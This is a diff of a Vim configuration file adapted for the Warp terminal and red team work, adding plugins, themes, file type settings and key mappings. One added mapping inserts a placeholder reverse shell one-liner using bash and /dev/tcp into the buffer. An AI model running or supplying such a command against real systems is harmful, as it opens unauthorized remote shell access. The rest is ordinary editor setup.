@@ -1,11 +1,23 @@
 " =============================================================================
-" Basic Settings
+" Basic Settings - Warp Terminal Optimized
 " =============================================================================
 syntax enable
 set nocompatible            " Be iMproved, required for some plugins
 filetype plugin indent on   " Enable filetype detection and indentation
 
-" General UI
+" Warp Terminal Optimizations
+if $TERM_PROGRAM ==# 'WarpTerminal'
+    set termguicolors       " Enable true color support in Warp
+    set t_Co=256            " 256 color support
+    set mouse=a             " Enable mouse support
+else
+    " Fallback for other terminals
+    if has('termguicolors')
+        set termguicolors
+    endif
+endif
+
+" General UI - Enhanced for terminal performance
 set ignorecase              " Ignore case when searching
 set smartcase               " Don't ignore case if search pattern contains uppercase
 set nowrap                  " Don't wrap lines
@@ -14,17 +26,25 @@ set relativenumber          " Show relative line numbers
 set ruler                   " Show row and column in status line
 set showcmd                 " Show incomplete commands
 set smartindent             " Smart auto-indenting
-set shiftwidth=2            " Number of spaces to use for autoindent
-set tabstop=2               " Number of spaces that a tab in the file uses
+set shiftwidth=4            " Number of spaces to use for autoindent (better for code)
+set tabstop=4               " Number of spaces that a tab in the file uses
 set expandtab               " Use spaces instead of tabs
 set backspace=indent,eol,start " Make backspace work like most other editors
 set hidden                  " Allow buffers to be hidden
 set noerrorbells            " Don't beep
 set visualbell              " Use visual bell instead of audible bell
 set wildmenu                " Enhanced command-line completion
+set wildmode=longest:full,full " Better command-line completion
 set scrolloff=8             " Keep 8 lines above/below cursor when scrolling
+set sidescrolloff=8         " Keep 8 columns left/right when scrolling
 set cmdheight=2             " Give more space for messages
-set updatetime=300          " Faster update for plugins like coc.nvim
+set updatetime=100          " Faster update for plugins and git signs
+set timeoutlen=500          " Faster key sequence timeout
+set laststatus=2            " Always show status line
+set showmatch               " Show matching brackets
+set cursorline              " Highlight current line
+set lazyredraw              " Don't redraw while executing macros (performance)
+set ttyfast                 " Fast terminal connection
 
 " Search
 set hlsearch                " Highlight search results
@@ -43,43 +63,81 @@ let maplocalleader = "\\"   " Set localleader key to backslash
 " =============================================================================
 call plug#begin('~/.vim/plugged')
 
-" Theme
+" Theme - Dark themes optimized for terminal work
 Plug 'dracula/vim', { 'as': 'dracula' }
+Plug 'catppuccin/vim', { 'as': 'catppuccin' }
+Plug 'tomasr/molokai'
 
 " General Utilities
-Plug 'tpope/vim-fugitive'
-Plug 'tpope/vim-surround'
-Plug 'tpope/vim-commentary'
-Plug 'scrooloose/nerdtree'
-Plug 'Xuyuanp/nerdtree-git-plugin'
-Plug 'jistr/vim-nerdtree-tabs'
-Plug 'vim-airline/vim-airline'
-Plug 'vim-airline/vim-airline-themes'
+Plug 'tpope/vim-fugitive'              " Git integration
+Plug 'tpope/vim-surround'              " Surround text objects
+Plug 'tpope/vim-commentary'            " Easy commenting
+Plug 'scrooloose/nerdtree'             " File explorer
+Plug 'Xuyuanp/nerdtree-git-plugin'     " Git status in NERDTree
+Plug 'vim-airline/vim-airline'         " Status line
+Plug 'vim-airline/vim-airline-themes'  " Airline themes
+Plug 'junegunn/fzf', { 'do': { -> fzf#install() } }  " Fuzzy finder
+Plug 'junegunn/fzf.vim'                " FZF vim integration
 
 " Language Support
-Plug 'fatih/vim-go', { 'do': ':GoUpdateBinaries' }
-Plug 'neoclide/coc.nvim', {'branch': 'release'}
+Plug 'fatih/vim-go', { 'do': ':GoUpdateBinaries' }  " Go development
+Plug 'neoclide/coc.nvim', {'branch': 'release'}     " Language server protocol
+Plug 'sheerun/vim-polyglot'            " Language pack
+
+" Red Team Specific
+Plug 'vim-scripts/indentpython.vim'    " Python indentation
+Plug 'plasticboy/vim-markdown'         " Markdown support for reports
+Plug 'instant-markdown/vim-instant-markdown', {'for': 'markdown', 'do': 'yarn install'}
 
 call plug#end()
 
 " =============================================================================
-" Theme Configuration
+" Theme Configuration - Warp Optimized
 " =============================================================================
-colorscheme dracula
 set background=dark
 
+" Try to set the best available colorscheme
+silent! colorscheme catppuccin_mocha
+if g:colors_name !=# 'catppuccin_mocha'
+    silent! colorscheme dracula
+    if g:colors_name !=# 'dracula'
+        silent! colorscheme molokai
+    endif
+endif
+
+" Enhanced syntax highlighting
+set synmaxcol=200           " Limit syntax highlighting for performance
+syntax sync minlines=256    " Start syntax highlighting from 256 lines back
+
 " =============================================================================
-" Plugin Specific Settings
+" Plugin Specific Settings - Red Team Enhanced
 " =============================================================================
 
 " NERDTree
 map <C-n> :NERDTreeToggle<CR>
 let g:NERDTreeDirArrowExpandable = '▸'
 let g:NERDTreeDirArrowCollapsible = '▾'
+let g:NERDTreeWinSize = 30
+let g:NERDTreeShowHidden = 1
+let g:NERDTreeMinimalUI = 1
+let g:NERDTreeDirArrows = 1
+let g:NERDTreeIgnore = ['\~$', '\.swp$', '\.git$', '__pycache__', '.DS_Store']
 
 " vim-airline
-let g:airline_theme='dracula'
+let g:airline_theme='catppuccin_mocha'
 let g:airline_powerline_fonts = 1
+let g:airline#extensions#tabline#enabled = 1
+let g:airline#extensions#tabline#buffer_nr_show = 1
+let g:airline#extensions#branch#enabled = 1
+let g:airline#extensions#coc#enabled = 1
+
+" FZF settings
+nnoremap <C-p> :Files<CR>
+nnoremap <C-f> :Rg<CR>
+nnoremap <leader>b :Buffers<CR>
+nnoremap <leader>h :History<CR>
+let g:fzf_preview_window = 'right:60%'
+let g:fzf_layout = { 'window': { 'width': 0.9, 'height': 0.6 } }
 
 " COC.nvim
 " TextEdit might fail if hidden is not set.
@@ -144,21 +202,55 @@ au FileType go nmap <Leader>i <Plug>(go-info)
 let g:go_doc_popup_window = 1
 
 " =============================================================================
-" Red Team Operations
+" Red Team Operations - Enhanced
 " =============================================================================
 
-" -- Syntax Highlighting --
-" Enable syntax highlighting for common red team file types
-" Using filetype on should handle most of these, but explicit settings are fine.
+" -- File Type Associations --
+" Red team specific file types
 au BufRead,BufNewFile *.ps1 set filetype=ps1
-au BufRead,BufNewFile *.py set filetype=python
+au BufRead,BufNewFile *.py set filetype=python | set shiftwidth=4 | set tabstop=4
 au BufRead,BufNewFile *.pl set filetype=perl
 au BufRead,BufNewFile *.rb set filetype=ruby
 au BufRead,BufNewFile *.php set filetype=php
+au BufRead,BufNewFile *.yaml,*.yml set filetype=yaml | set shiftwidth=2 | set tabstop=2
+au BufRead,BufNewFile *.json set filetype=json | set shiftwidth=2 | set tabstop=2
+au BufRead,BufNewFile *.md,*.markdown set filetype=markdown | set wrap | set linebreak
+au BufRead,BufNewFile Dockerfile* set filetype=dockerfile
+au BufRead,BufNewFile *.conf,*.config set filetype=config
+au BufRead,BufNewFile *.log set filetype=log | set nowrap
 
-" -- Snippets --
-" To use snippets, you need a snippet engine like ultisnips or neosnippet.
-" Once you have a snippet engine installed, you can add snippets like this:
-" snippet revshell "Reverse Shell"
-"   bash -i >& /dev/tcp/LHOST/LPORT 0>&1
-" endsnippet
+" -- Red Team Shortcuts --
+" Quick templates for common tasks
+nnoremap <leader>rs :r !echo 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'<CR>
+nnoremap <leader>py :r !echo '#!/usr/bin/env python3'<CR>
+nnoremap <leader>sh :r !echo '#!/bin/bash'<CR>
+nnoremap <leader>md :r !echo '# Red Team Report'<CR>:r !echo ''<CR>:r !echo '## Executive Summary'<CR>
+
+" -- Markdown settings for reports --
+let g:vim_markdown_folding_disabled = 1
+let g:vim_markdown_conceal = 0
+let g:vim_markdown_frontmatter = 1
+
+" -- Python specific settings --
+autocmd FileType python set colorcolumn=88  " PEP 8 line length
+autocmd FileType python set textwidth=88
+
+" -- Search enhancements --
+" Highlight all instances of word under cursor
+nnoremap <silent> <F8> :let @/='\<<C-R>=expand("<cword>")\><CR>\>'<CR>:set hls<CR>
+
+" -- Quick save and quit --
+nnoremap <leader>w :w<CR>
+nnoremap <leader>q :q<CR>
+nnoremap <leader>x :x<CR>
+
+" -- Buffer navigation --
+nnoremap <leader>n :bnext<CR>
+nnoremap <leader>p :bprev<CR>
+nnoremap <leader>d :bdelete<CR>
+
+" -- Split navigation --
+nnoremap <C-h> <C-w>h
+nnoremap <C-j> <C-w>j
+nnoremap <C-k> <C-w>k
+nnoremap <C-l> <C-w>l
